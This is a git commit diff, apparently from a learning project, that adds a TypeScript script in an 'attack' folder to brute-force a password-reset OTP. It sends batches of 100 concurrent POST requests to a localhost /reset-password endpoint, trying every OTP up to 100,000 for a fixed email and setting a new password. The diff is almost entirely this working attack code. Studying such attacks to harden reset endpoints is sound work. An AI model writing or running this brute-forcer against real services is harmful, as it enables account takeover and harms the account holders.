aa444c769eb2b3b40aea93e43cc35dca42783127
pratikprajapati0708 <prajapatipratik292@gmail.com>
2024-05-03 01:59:59 +0530

    Added BruteForce logic to hit the server

--- attack/src/index.ts
+++ attack/src/index.ts
@@ -1,24 +1,39 @@
 const axios = require('axios');
-let data = JSON.stringify({
-  "email": "kpratik23@gmail.com",
-  "otp": "359628",
-  "newPassword": "test@123456"
-});
 
-let config = {
-  method: 'post',
-  maxBodyLength: Infinity,
-  url: 'http://localhost:3000/reset-password',
-  headers: { 
-    'Content-Type': 'application/json'
-  },
-  data : data
-};
+async function sendRequest(otp: number) {
+    let data = JSON.stringify({
+        "email": "kpratik23@gmail.com",
+        "otp": otp,
+        "newPassword": "test@123456"
+      });
+      
+      let config = {
+        method: 'post',
+        maxBodyLength: Infinity,
+        url: 'http://localhost:3000/reset-password',
+        headers: { 
+          'Content-Type': 'application/json'
+        },
+        data : data
+      };
+      
+      try {
+        await axios.request(config)
+        console.log("done for " + otp);
+      } catch(e) {
+        
+      }
+}
 
-axios.request(config)
-.then((response) => {
-  console.log(JSON.stringify(response.data));
-})
-.catch((error) => {
-  console.log(error);
-});
+async function main() {
+    for (let i = 0; i < 100000; i+=100) {
+      const promises = [];
+      console.log("here for " + i);
+      for (let j = 0; j < 100; j++) {
+        promises.push(sendRequest(i + j))
+      }
+      await Promise.all(promises);
+    }
+  }
+
+  main()
